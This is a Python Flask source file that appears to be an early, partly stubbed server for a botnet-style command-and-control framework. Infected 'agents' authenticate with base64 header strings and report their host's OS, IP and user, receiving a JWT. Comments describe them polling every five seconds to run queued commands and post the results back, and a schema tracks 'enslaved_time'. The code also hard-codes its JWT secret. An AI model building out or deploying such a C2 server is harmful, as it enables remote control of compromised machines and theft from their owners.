from flask import Flask, jsonify, request
from flask_jwt_extended import (
    JWTManager, jwt_required, create_access_token,
    get_jwt_identity
)
import json
import sys
import couchdb


app = Flask(__name__)

app.config['JWT_SECRET_KEY'] = 'dawoof7123'
jwt = JWTManager(app)

@app.route('/first_check_in', methods = ['POST'])
def first_checkin():
	print(request)
	headers = request.headers
	print(headers)
	if not request.is_json:
		return jsonify({"Error":"Unauthorized"})
	print
	if headers.get("User-Agent") != "QmxhY2tUYWJieQo=": ### BlackTabby Base64 Encoded
		return jsonify({"Error":"Unauthorized"})
	if headers.get("Agent") != "TGVhcm5pbmdDVG9CRWxpdGUK": ###Base64 LearningCToBElite
		return jsonify({"Error":"Unauthorized"})
	## gather parameters from json ##
	try:
	  content = request.get_json()
	  agent_id = content['agent_id']
	  os = content['os']
	  ip = content['ip']
	  user = content['user']
	  token = generate_token(agent_id)
	  return jsonify(access_token=token)
	except:
	  return jsonify({"Error":"Missing Parameters"})


def generate_token(agent_id):
	print("the function that actually generates the json token")
	access_token = create_access_token(identity=agent_id)
	print(access_token)
	return access_token



'''
	IF AUTH WORKS, PERFORM FIRST CHECK_IN
	FIRST CHECK_IN SENDS INITIAL DATA TO DATABASE
	AFTER THAT AGENT WILL POLL THIS APPLICATION ON THE /polling route
	for new commands


AGENT -> POST -> /first_check_in
^^^
Agent first checks in, he authenticates now hes in the database and can be controlled via the cli app
he is assigned a token that is used for subesquent requests

AGENT -> GET -> /polling 

Agent is now polling this app every 5 seconds waiting for something to show in the pending commands array
if something is there agent will run that command 

AGENT -> POST ->/polling
after a command is gotten via the get request if it is successfully ran it will 
POST the results of the command to the database via POST request to poll 

then it will go back to polling /get via get

'''
@app.route("/polling",methods = ['POST','GET'])
def polling():
	print("if GET check for pending commands, IF POST post command results")








app.run(debug=True,port=9000)
#ssl_context='adhoc'








# json format always
'''
    	agent_id: int
    	OS: str
    	ip: str
    	user: str
    	completed_commands: list
  	  	pending_commands:list
    	enslaved_time: datetime 
  '''